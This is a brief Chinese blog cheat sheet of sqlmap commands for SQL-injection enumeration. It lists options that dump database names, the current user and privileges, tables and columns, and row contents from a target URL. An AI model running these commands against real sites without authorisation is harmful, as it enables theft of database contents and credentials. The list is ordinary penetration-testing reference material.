---
title: sqlmap基本用法
date: 2019-06-02 16:27:57
tags: sqlmap
---
sqlmap总结（以后会更新）
<!-- more -->

sqlmap.py -u url --dbs 				//爆数据库
sqlmap.py -u url --current-db				 //爆当前库
sqlmap.py -u url --current-user 			//爆当前用户
sqlmap.py -u url --users   				查看用户权限
sqlmap.py -u url --tables -D 数据库 			//爆表
sqlmap.py -u url --columns -T 表段 -D 数据库		 //爆字段
sqlmap.py -u url --dump -C 字段 -T 表段 -D 数据库 		//爆内容
sqlmap.py -u url --dump --start=1 --stop=3 -C 字段 -T 表段 -D 数据库 		//猜解1到3的字段